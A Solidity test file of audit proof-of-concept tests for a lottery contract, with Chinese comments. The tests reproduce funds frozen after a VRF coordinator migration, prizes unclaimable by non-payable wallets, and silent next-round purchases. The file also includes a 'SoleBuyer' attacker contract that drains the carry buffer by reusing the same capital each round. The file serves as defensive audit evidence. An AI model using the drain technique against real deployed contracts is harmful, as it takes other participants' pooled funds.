// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Lottery} from "../src/Lottery.sol";
import {LotteryTestBase} from "./Lottery.t.sol";

/// @title 第 20 轮审计的可执行证据（PoC）
/// @notice **这些测试断言的是当前的（有缺陷的）行为**，不是期望行为。
///         它们的作用是把审计结论固定成可复现的事实；一旦对应问题被修复，
///         必须把这里的断言反转（而不是删掉测试）。
///         对应报告：`docs/audit/AUDIT-2026-08-11-R20.md`

/// @dev 只买票、不能收原生币的合约钱包（无 receive/fallback）
contract NonPayableBuyer {
    Lottery private immutable i_lottery;

    constructor(Lottery lottery_) {
        i_lottery = lottery_;
    }

    function buy(uint32 quantity) external payable {
        i_lottery.buyTickets{value: msg.value}(quantity);
    }

    function claim(uint32 roundId, uint8 tier) external {
        i_lottery.claim(roundId, tier);
    }
}

/// @dev 条件买入包装：只有本期还没人买票时才买，使「唯一买家」策略从 +EV 变成零风险
contract SoleBuyer {
    Lottery private immutable i_lottery;

    error NotSoleBuyer();

    constructor(Lottery lottery_) {
        i_lottery = lottery_;
    }

    function buyOnlyIfEmpty(uint32 roundId, uint32 batches, uint32 perBatch) external {
        (,,, uint32 ticketCount,,,,,) = i_lottery.getRound(roundId);
        if (ticketCount != 0) revert NotSoleBuyer();
        for (uint32 i = 0; i < batches; i++) {
            i_lottery.buyTickets{value: i_lottery.i_ticketPrice() * perBatch}(perBatch);
        }
    }

    function claim(uint32 roundId, uint8 tier) external {
        i_lottery.claim(roundId, tier);
    }

    receive() external payable {}
}

contract AuditR20PocTest is LotteryTestBase {
    // ===== H-1：VRF 订阅迁移把「防篡改闸」变成永久冻结闸 =====
    //
    // VRFCoordinatorV2_5.migrate(subId, newCoordinator) 由**订阅所有者**发起，会
    //   ① 在旧 coordinator 上 _deleteSubscription(subId)
    //   ② 以 coordinator 自己的身份对每个 consumer 调 setCoordinator(newCoordinator)
    //      （基类的 onlyOwnerOrCoordinator 允许 coordinator 调用）
    // 本合约把 coordinator 钉死为 immutable 以防 owner 换源操纵开奖（第一轮 Critical），
    // 但同一处防线把**合法迁移**也判成篡改：回调恒 revert CoordinatorTampered，
    // 请求恒发往订阅已被删除的旧 coordinator。

    /// @dev 迁移后，已在 DRAWING 的期永远无法结算：真回调被拒、retryDraw 也救不回来
    function test_Poc_H1_MigrationFreezesInFlightRound() public {
        _buy(alice, 100);
        assertEq(address(lottery).balance, 100 * PRICE);

        vm.warp(_drawTimeOf(1));
        lottery.performUpkeep("");
        (uint256 requestId,) = lottery.vrfRequestOf(1);
        assertGt(requestId, 0, "request must exist before migration");

        address newCoordinator = _simulateSubscriptionMigration();

        // 真·新 coordinator 的回调被自家的防篡改闸拒绝
        uint256[] memory words = new uint256[](1);
        words[0] = 42;
        vm.prank(newCoordinator);
        vm.expectRevert(Lottery.CoordinatorTampered.selector);
        lottery.rawFulfillRandomWords(requestId, words);

        // retryDraw 也救不回来：请求恒发往旧 coordinator，那里已无此 consumer
        vm.warp(block.timestamp + DRAW_TIMEOUT_PLUS);
        vm.expectRevert();
        lottery.retryDraw(1);

        // 该期永久停在 DRAWING，100 张票的钱一分也出不来
        assertEq(uint8(_stateOf(1)), uint8(Lottery.RoundState.DRAWING));
        assertEq(lottery.perWinnerAmount(1, 0), 0);
        vm.expectRevert(Lottery.RoundNotSettled.selector);
        lottery.claim(1, 0);
        assertEq(address(lottery).balance, 100 * PRICE, "funds are stuck in the contract");
    }

    /// @dev 更糟的是彩票并不停摆：新期照常开出、照常收钱，但一期也结算不了
    function test_Poc_H1_MigratedLotteryKeepsTakingMoneyAndNeverSettles() public {
        _simulateSubscriptionMigration();

        for (uint32 id = 1; id <= 3; id++) {
            _buy(bob, 10);
            vm.warp(_drawTimeOf(id));
            lottery.performUpkeep("");
            assertEq(uint8(_stateOf(id)), uint8(Lottery.RoundState.DRAWING));
            (uint256 reqId,) = lottery.vrfRequestOf(id);
            assertEq(reqId, 0, "VRF request must have failed");
        }
        assertEq(lottery.s_currentRound(), 4, "rounds keep opening and keep taking money");

        // 抽成仍可提走（与奖池分账，FR-C-20），但 99% 的票款是奖池：
        // claim 需要 SETTLED，而这些期永远到不了 SETTLED，且 FR-C-24 禁止任何取回路径
        assertEq(address(lottery).balance, 30 * PRICE);
        assertEq(30 * PRICE - lottery.s_accruedFees(), (30 * PRICE * 9900) / 10000);
    }

    // ===== M-1：不能接收原生币的合约钱包，中奖后奖金永久领不出来 =====

    function test_Poc_M1_NonPayableWinnerCannotClaim() public {
        NonPayableBuyer wallet = new NonPayableBuyer(lottery);
        vm.deal(address(this), 1 ether);
        wallet.buy{value: PRICE * 10}(10); // 买光全场，必中一等奖

        _triggerDraw(1);
        _fulfill(1, 42);

        uint256[] memory pending = lottery.pendingPrizes(1, address(wallet));
        assertGt(pending[0], 0, "the contract wallet really is the tier-1 winner");

        // 界面显示「可领 594e12」，但领奖恒 revert；90 天后被 rolloverExpired 扫走
        vm.expectRevert(Lottery.TransferFailed.selector);
        wallet.claim(1, 0);
    }

    // ===== L-1：buyTickets 没有 roundId 闸，延迟上链会静默买进下一期 =====

    function test_Poc_L1_DelayedBuyLandsInNextRound() public {
        uint32 seen = lottery.s_currentRound();
        _buy(alice, 1);
        _triggerDraw(seen); // 开奖并立即开出下一期（FR-C-10）
        assertEq(lottery.s_currentRound(), seen + 1);

        // 用户以为在给 seen 期买票，交易晚了 SEAL_GAP 才上链
        _buy(bob, 5);
        assertEq(lottery.ticketsOwned(seen, bob), 0, "bob got nothing in the round he saw");
        assertEq(lottery.ticketsOwned(seen + 1, bob), 5, "bob silently bought into the next round");
    }

    // ===== H-2：FR-C-27 配比的资本门槛是**可循环使用**的 =====
    // SPEC 说「投 X 至多撬动 X 的 carry」，读起来像是要吃下整包 carry 就得备齐等额资本。
    // 实际上本金随中奖立刻回到攻击者手里，同一笔钱每期复用一次，
    // 每期净赚≈本金（只付 1% 抽成），整包 carry 会被逐期抽干。

    function test_Poc_H2_SoleBuyerRecyclesCapitalToDrainBuffer() public {
        _inject(carol, 1, 10 ether); // 运营方冷启动注资 10 ETH
        _triggerDraw(1); // 第 1 期零购票 → VOIDED，10 ETH 经缓冲释放进第 2 期
        assertEq(uint8(_stateOf(1)), uint8(Lottery.RoundState.VOIDED));
        assertEq(_potOf(2), 10 ether);

        SoleBuyer attacker = new SoleBuyer(lottery);
        vm.deal(address(attacker), 1 ether);
        uint256 bankroll = address(attacker).balance;

        // 停售前最后一刻确认无人买票才买 1 ETH（1000 张 × 10 批）
        vm.warp(_closeTimeOf(2) - 1);
        attacker.buyOnlyIfEmpty(2, 10, 1000);
        _triggerDraw(2);
        _fulfill(2, 42);
        attacker.claim(2, 0);
        attacker.claim(2, 1);
        attacker.claim(2, 2);

        // 1 ETH 本金变成 1.98 ETH：净赚等额 carry 减去 1% 抽成，且零风险
        assertEq(address(attacker).balance, 1.98 ether);
        assertGt(address(attacker).balance, bankroll, "sole buyer profits risk-free");
        // 余下 9.01 ETH 留在缓冲，等着下一期用同一笔本金再抽一次
        assertEq(lottery.s_pendingPot() + lottery.s_pendingTier1(), 9.01 ether);
    }

    // ===== helper =====

    uint256 private constant DRAW_TIMEOUT_PLUS = 3 hours + 1;

    /// @dev 复现 VRFCoordinatorV2_5.migrate 对 consumer 的两个副作用
    function _simulateSubscriptionMigration() private returns (address newCoordinator) {
        newCoordinator = makeAddr("newVrfCoordinator");
        // ① 旧 coordinator 不再认这个 consumer（等效于 _deleteSubscription）
        coordinator.removeConsumer(subId, address(lottery));
        // ② 旧 coordinator 以自己的身份把 consumer 指向新源
        vm.prank(address(coordinator));
        lottery.setCoordinator(newCoordinator);
    }
}
